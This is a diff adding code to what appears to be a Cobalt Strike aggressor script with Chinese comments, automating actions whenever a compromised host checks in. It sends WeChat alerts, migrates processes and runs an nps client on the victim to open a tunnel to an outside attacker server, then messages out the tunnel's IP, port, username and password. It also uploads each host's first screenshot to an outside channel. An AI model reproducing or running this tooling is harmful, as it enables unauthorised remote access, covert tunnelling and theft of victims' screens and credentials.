+		bexecute($1, "npc -server=".$nps_ip.":".$nps_bridge_port." -vkey=".$nps_vkey." -type=tcp");
+		
+		# 获得nps客户端列表 # 通过回调函数来判断是否上传完
+		bls($1, ".", lambda({  
+			local('$isconnect $text');		
+			sleep(3 * 1000); # 等待3秒
+			$isconnect = isconnect($nps_id);
+			# 判断是否连接成功
+			if ($isconnect eq "true") {
+				bnote($1, "port: ".$nps_port); # 备注  端口号
+				highlight("beacons", @(bdata($1)), "good"); # 标记颜色 绿色
+				# 发送
+				$text = "nps 隧道建立成功\r\n\r\n";
+				$text = $text."IP    ：".$nps_ip."\r\n";
+				$text = $text."端口：".$nps_port."\r\n";
+				$text = $text."用户：".$nps_user."\r\n";
+				$text = $text."密码：".$nps_passwd;
+				send_text($text);
+			} else {
+				send_text("npc可能被杀或npc上传超时，一般sleep 10都会显示正常，超时时间5分钟，建议查看情况");
+			}
+		}));
+	} else{
+		send_text("添加socks5隧道失败，nps api问题");
+	}
+	#nps_del();
+}
+
+
+# 判断是否这台主机的第一张截图
+sub first_screenshot {
+
+	# 循环对比所有已有beacon  有没有重复的目标
+	foreach $screenshot (screenshots()) {
+		# 不检查自己
+		if ($screenshot['id'] eq $1["id"]) {continue;}
+		
+		# 对比是否有beacon ID一样的
+		if (($screenshot['bid'] eq $1["bid"])) {
+			# 对比谁的时间早 如果晚就返回false
+			if ($screenshot['when'] lt $1["when"]) {
+				return false;
+			}
+		}
+	}
+	return true;
+}
+
+on screenshots {
+
+	# 是否开启发送截图  判断是否这台主机的第一张截图
+	if (($is_screenshot eq "true") && first_screenshot($1)) {
+	
+		# 提示截图成功
+		blog($1["bid"], "截图成功, bid:".$1["bid"]."   ".dstamp($1["when"]));
+		
+		# 上传图片
+		if ($is_lastf eq "图片") {
+			send_image($1["data"]);
+		}else{
+			send_image_last($1["bid"], $1["data"]);
+		}
+		blog($1["bid"], "图片上传成功");
+	}
+}
+
+# 有新的 beacons 会触发
+on beacon_initial {
+	# 查重
+	if (is_repeat($1, $beacon_repeat, $onbre, beacons())){
+	
+		# 微信推送总开关
+		if ($onwx eq "true") {
+			wxtuisong($1);
+		}
+		
+		# 进程迁移
+		if ($migration eq "true") {
+			migration_pid($1);
+		}
+		
+		# nps
+		if ($nps_on eq "true") {
+			nps_start($1);
+		}
+	}
+}
